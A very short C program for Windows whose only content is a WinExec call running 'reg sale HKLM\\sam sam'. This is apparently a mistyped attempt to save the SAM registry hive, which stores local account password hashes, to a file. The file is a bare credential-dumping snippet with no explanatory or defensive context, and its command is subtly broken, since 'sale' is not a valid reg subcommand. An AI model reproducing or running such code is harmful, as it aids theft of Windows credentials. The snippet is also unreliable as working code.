#include <windows.h>

#define RUN(toRun) WinExec(toRun, SW_SHOW);

int main() {
    RUN("reg sale HKLM\\sam sam");
    return 0;
}